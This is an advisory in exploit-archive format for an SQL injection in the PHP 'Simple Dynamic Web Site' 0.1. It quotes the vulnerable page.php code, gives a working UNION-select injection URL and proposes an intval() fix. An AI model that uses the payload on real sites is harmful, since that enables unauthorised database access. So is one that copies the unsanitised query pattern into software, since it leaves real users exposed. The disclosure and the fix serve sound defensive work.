@@ -1,0 +1,55 @@
+# Exploit Title.............. Simple Dynamic Web SQL Injection
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/php/10888/simple-dynamic-web-site.html
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/Chinthaka%20Deshapriya/dynamic_web_page.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in /page.php
+
+----snip----
+
+	$prodID = $_GET['prodid'];
+
+	if(!empty($prodID)){
+		$sqlSelectSpecProd = mysql_query("select * from page where id = '$prodID'") or die(mysql_error());
+		$getProdInfo = mysql_fetch_array($sqlSelectSpecProd);
+		$ptitle = $getProdInfo["title"];
+		$pdes = $getProdInfo["description"];
+		$pimg = $getProdInfo["imgUrl"];
+				}
+
+----snip----
+
+Example exploitation
+--------------------
+http://server/path_to_webapp/page.php?prodid=-3%27%20union%20select%201,2,@@version,4--+
+
+How to fix
+----------
+Simple method's use the php function intval.
+For example
+
+	$prodID = intval($_GET['prodid']);
+
+	if(!empty($prodID)){
+		$sqlSelectSpecProd = mysql_query("select * from page where id = '$prodID'") or die(mysql_error());
+		$getProdInfo = mysql_fetch_array($sqlSelectSpecProd);
+		$ptitle = $getProdInfo["title"];
+		$pdes = $getProdInfo["description"];
+		$pimg = $getProdInfo["imgUrl"];
+				}
+
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/php/10888/simple-dynamic-web-site.html
+http://php.net/manual/en/function.intval.php
